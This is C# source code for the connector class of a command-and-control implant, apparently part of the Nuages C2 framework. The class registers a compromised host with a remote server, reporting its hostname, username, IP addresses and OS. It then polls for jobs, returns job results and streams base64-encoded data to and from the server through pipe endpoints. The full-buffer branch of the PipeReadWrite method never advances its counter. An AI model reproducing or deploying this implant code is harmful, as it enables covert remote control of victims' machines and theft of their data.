using System;
using System.Collections.Generic;
using System.IO;
using System.Json;

namespace NuagesSharpImplant
{
    public class NuagesC2Connector
    {
        private NuagesC2Connection NC2Con;

        public NuagesC2Connector(NuagesC2Connection NC2Con)
        {
            this.NC2Con = NC2Con;
        }

        public string getConnectionString()
        {
            return this.NC2Con.getConnectionString();
        }

        public string getHandler()
        {
            return this.NC2Con.getHandler();
        }

        public int getBufferSize()
        {
            return this.NC2Con.getBufferSize();
        }

        public int getRefreshRate()
        {
            return this.NC2Con.getRefreshRate();
        }
        public void setRefreshRate(int refreshrate)
        {

            this.NC2Con.setRefreshRate(refreshrate);

        }

        public void setBufferSize(int buffersize)
        {

            this.NC2Con.setBufferSize(buffersize);

        }
        string POST(string url, string jsonContent)
        {
            return this.NC2Con.POST(url, jsonContent);
        }

        public void SubmitJobResult(string jobId, string result = "", bool moreData = false, bool error = false, int n = 0, string data = "")
        {
            List<KeyValuePair<string, JsonValue>> list = new List<KeyValuePair<string, JsonValue>>();
            list.Add(new KeyValuePair<string, JsonValue>("jobId", jobId));
            list.Add(new KeyValuePair<string, JsonValue>("result", result));
            list.Add(new KeyValuePair<string, JsonValue>("moreData", moreData));
            list.Add(new KeyValuePair<string, JsonValue>("error", error));
            list.Add(new KeyValuePair<string, JsonValue>("n", n));
            list.Add(new KeyValuePair<string, JsonValue>("data", data));
            JsonObject body = new JsonObject(list);
            this.POST("jobresult", body.ToString());
        }

        public string RegisterImplant(string type = "", string hostname = "", string username = "", string localIp = "", string sourceIp = "", string os = "", string handler = "", string connectionString = "", Dictionary<string, string> config = null, String[] supportedPayloads = null)
        {

            List<KeyValuePair<string, JsonValue>> configList = new List<KeyValuePair<string, JsonValue>>();
            foreach (KeyValuePair<string, string> p in config)
            {
                configList.Add(new KeyValuePair<string, JsonValue>(p.Key, p.Value));
            }
            JsonObject configObject = new JsonObject(configList);

            JsonArray supportedPayloadsArray = new JsonArray();

            foreach (string p in supportedPayloads) {
                supportedPayloadsArray.Add(p);
            }

            List<KeyValuePair<string, JsonValue>> list = new List<KeyValuePair<string, JsonValue>>();
            list.Add(new KeyValuePair<string, JsonValue>("implantType", type));
            list.Add(new KeyValuePair<string, JsonValue>("hostname", hostname));
            list.Add(new KeyValuePair<string, JsonValue>("username", username));
            list.Add(new KeyValuePair<string, JsonValue>("localIp", localIp));
            list.Add(new KeyValuePair<string, JsonValue>("sourceIp", sourceIp));
            list.Add(new KeyValuePair<string, JsonValue>("os", os));
            list.Add(new KeyValuePair<string, JsonValue>("handler", handler));
            list.Add(new KeyValuePair<string, JsonValue>("connectionString", connectionString));
            list.Add(new KeyValuePair<string, JsonValue>("config", configObject));
            list.Add(new KeyValuePair<string, JsonValue>("supportedPayloads", supportedPayloadsArray));
            JsonObject body = new JsonObject(list);

            JsonValue response = JsonValue.Parse(this.POST("register", body.ToString()));
            return response["_id"];
        }

        public JsonArray Heartbeat(string implantId)
        {
            List<KeyValuePair<string, JsonValue>> list = new List<KeyValuePair<string, JsonValue>>();
            list.Add(new KeyValuePair<string, JsonValue>("id", implantId));
            JsonObject body = new JsonObject(list);
            JsonValue response = JsonValue.Parse(this.POST("heartbeat", body.ToString()));
            return (JsonArray)response["data"];
        }

        public byte[] PipeRead(string pipe_id, int BytesWanted)
        {
            byte[] buffer;
            using (MemoryStream memory = new MemoryStream())
            {
                while (memory.Length < BytesWanted)
                {
                    List<KeyValuePair<string, JsonValue>> list = new List<KeyValuePair<string, JsonValue>>();
                    list.Add(new KeyValuePair<string, JsonValue>("pipe_id", pipe_id));
                    list.Add(new KeyValuePair<string, JsonValue>("maxSize", Math.Min(this.getBufferSize(), BytesWanted - memory.Length)));
                    JsonObject body = new JsonObject(list);
                    JsonValue response = JsonValue.Parse(this.POST("io", body.ToString()));
                    buffer = Convert.FromBase64String(response["out"]);
                    memory.Write(buffer, 0, buffer.Length);
                    System.Threading.Thread.Sleep(this.getRefreshRate());
                }
                return memory.ToArray();
            }
        }

        public void Pipe2Stream(string pipe_id, int BytesWanted, Stream stream)
        {
            int ReadBytes = 0;
            byte[] buffer;
            while (ReadBytes < BytesWanted)
            {
                List<KeyValuePair<string, JsonValue>> list = new List<KeyValuePair<string, JsonValue>>();
                list.Add(new KeyValuePair<string, JsonValue>("pipe_id", pipe_id));
                list.Add(new KeyValuePair<string, JsonValue>("maxSize", Math.Min(this.getBufferSize(), BytesWanted - ReadBytes)));
                JsonObject body = new JsonObject(list);
                JsonValue response = JsonValue.Parse(this.POST("io", body.ToString()));
                buffer = Convert.FromBase64String(response["out"]);
                ReadBytes += buffer.Length;
                stream.Write(buffer, 0, buffer.Length);
                System.Threading.Thread.Sleep(this.getRefreshRate());
            }
        }

        public void Stream2Pipe(string pipe_id, Stream stream)
        {
            int ReadBytes = 0;
            byte[] buffer = new byte[this.getBufferSize()];
            JsonObject body;
            List<KeyValuePair<string, JsonValue>> list;
            while ((ReadBytes = stream.Read(buffer, 0, this.getBufferSize())) > 0)
            {
                if (ReadBytes < this.getBufferSize())
                {
                    byte[] buffer2 = new byte[ReadBytes];
                    Array.Copy(buffer, 0, buffer2, 0, ReadBytes);
                    list = new List<KeyValuePair<string, JsonValue>>();
                    list.Add(new KeyValuePair<string, JsonValue>("pipe_id", pipe_id));
                    list.Add(new KeyValuePair<string, JsonValue>("maxSize", 0));
                    list.Add(new KeyValuePair<string, JsonValue>("in", Convert.ToBase64String(buffer2)));
                    body = new JsonObject(list);
                }
                else
                {
                    list = new List<KeyValuePair<string, JsonValue>>();
                    list.Add(new KeyValuePair<string, JsonValue>("pipe_id", pipe_id));
                    list.Add(new KeyValuePair<string, JsonValue>("maxSize", 0));
                    list.Add(new KeyValuePair<string, JsonValue>("in", Convert.ToBase64String(buffer)));
                    body = new JsonObject(list);
                }
                this.POST("io", body.ToString());
                System.Threading.Thread.Sleep(this.getRefreshRate());
            }
        }

        public byte[] PipeRead(string pipe_id)
        {
            List<KeyValuePair<string, JsonValue>>  list = new List<KeyValuePair<string, JsonValue>>();
            list.Add(new KeyValuePair<string, JsonValue>("pipe_id", pipe_id));
            list.Add(new KeyValuePair<string, JsonValue>("maxSize", this.getBufferSize()));
            JsonObject body = new JsonObject(list);
            JsonValue response = JsonValue.Parse(this.POST("io", body.ToString()));
            return Convert.FromBase64String(response["out"]);
        }

        public void PipeWrite(string pipe_id, byte[] data)
        {
            int sentData = 0;
            int refreshrate = this.getRefreshRate();
            int bufferSize = this.getBufferSize();
            byte[] buffer = new byte[bufferSize];
            JsonObject body;
            List<KeyValuePair<string, JsonValue>> list;
            while (sentData < data.Length)
            {
                if ((data.Length - sentData) < bufferSize) {
                    byte[] buffer2 = new byte[data.Length - sentData];
                    Array.Copy(data, sentData, buffer2, 0, data.Length - sentData);
                    list = new List<KeyValuePair<string, JsonValue>>();
                    list.Add(new KeyValuePair<string, JsonValue>("pipe_id", pipe_id));
                    list.Add(new KeyValuePair<string, JsonValue>("maxSize", 0));
                    list.Add(new KeyValuePair<string, JsonValue>("in", Convert.ToBase64String(buffer2)));
                    body = new JsonObject(list);

                    sentData = data.Length;
                }
                else
                {
                    Array.Copy(data, sentData, buffer, 0, bufferSize);
                    list = new List<KeyValuePair<string, JsonValue>>();
                    list.Add(new KeyValuePair<string, JsonValue>("pipe_id", pipe_id));
                    list.Add(new KeyValuePair<string, JsonValue>("maxSize", 0));
                    list.Add(new KeyValuePair<string, JsonValue>("in", Convert.ToBase64String(buffer)));
                    body = new JsonObject(list);
                    sentData += bufferSize;
                }
                this.POST("io", body.ToString());
                System.Threading.Thread.Sleep(refreshrate);
            }
            return;
        }

        public byte[] PipeReadWrite(string pipe_id, byte[] data)
        {
            int sentData = 0;
            int refreshrate = this.getRefreshRate();
            int bufferSize = this.getBufferSize();
            byte[] buffer = new byte[bufferSize];
            JsonObject body;
            List<KeyValuePair<string, JsonValue>> list;
            using (MemoryStream memory = new MemoryStream()) { 
                while (sentData < data.Length)
                {
                    if ((data.Length - sentData) < bufferSize)
                    {
                        byte[] buffer2 = new byte[data.Length - sentData];
                        Array.Copy(data, sentData, buffer2, 0, data.Length - sentData);
                        list = new List<KeyValuePair<string, JsonValue>>();
                        list.Add(new KeyValuePair<string, JsonValue>("pipe_id", pipe_id));
                        list.Add(new KeyValuePair<string, JsonValue>("maxSize", bufferSize));
                        list.Add(new KeyValuePair<string, JsonValue>("in", Convert.ToBase64String(buffer2)));
                        body = new JsonObject(list);

                        sentData = data.Length;
                    }
                    else
                    {
                        Array.Copy(data, sentData, buffer, 0, bufferSize);
                        list = new List<KeyValuePair<string, JsonValue>>();
                        list.Add(new KeyValuePair<string, JsonValue>("pipe_id", pipe_id));
                        list.Add(new KeyValuePair<string, JsonValue>("maxSize", bufferSize));
                        list.Add(new KeyValuePair<string, JsonValue>("in", Convert.ToBase64String(buffer)));
                        body = new JsonObject(list);
                    }
                    JsonValue response = JsonValue.Parse(this.POST("io", body.ToString()));
                    buffer = Convert.FromBase64String(response["out"]);
                    memory.Write(buffer, 0, buffer.Length);
                    System.Threading.Thread.Sleep(this.getRefreshRate());
                    System.Threading.Thread.Sleep(refreshrate);
                }
                return memory.ToArray();
            }

        }
    }
}

